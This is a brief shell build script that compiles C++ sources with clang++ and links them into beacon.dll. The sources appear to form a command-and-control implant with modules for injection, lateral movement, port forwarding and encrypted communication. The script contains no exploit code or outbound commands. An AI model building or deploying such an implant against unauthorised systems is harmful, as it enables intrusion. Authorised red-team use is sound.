mkdir release
clang++ -c BeaconBof.cpp -o ./release/BeaconBof.o
clang++ -c BeaconFileManage.cpp -o ./release/BeaconFileManage.o
clang++ -c BeaconInject.cpp -o ./release/BeaconInject.o
clang++ -c BeaconJob.cpp -o ./release/BeaconJob.o
clang++ -c BeaconLateralMovement.cpp -o ./release/BeaconLateralMovement.o
clang++ -c beaconMain.cpp -o ./release/beaconMain.o
clang++ -c Beaconrportfwd.cpp -o ./release/Beaconrportfwd.o
clang++ -c BeaconSleep.cpp -o ./release/BeaconSleep.o
clang++ -c BeaconTask.cpp -o ./release/BeaconTask.o
clang++ -c BeaconX64.cpp -o ./release/BeaconX64.o
clang++ -c ChildBeacon.cpp -o ./release/ChildBeacon.o
clang++ -c comm.cpp -o ./release/comm.o
clang++ -c common.cpp -o ./release/common.o
clang++ -c encrypt_decrypt.cpp -o ./release/encrypt_decrypt.o
clang++ -c Global.cpp -o ./release/Global.o
clang++ -c rotation.cpp -o ./release/rotation.o
clang++ -c Utils.cpp -o ./release/Utils.o
clang++ ./release/Utils.o ./release/rotation.o ./release/Global.o ./release/encrypt_decrypt.o ./release/common.o ./release/comm.o ./release/ChildBeacon.o ./release/BeaconX64.o ./release/BeaconTask.o ./release/BeaconSleep.o ./release/Beaconrportfwd.o ./release/BeaconLateralMovement.o ./release/BeaconJob.o ./release/BeaconInject.o ./release/BeaconFileManage.o ./release/BeaconBof.o ./release/beaconMain.o -shared -o ./release/beacon.dll -v 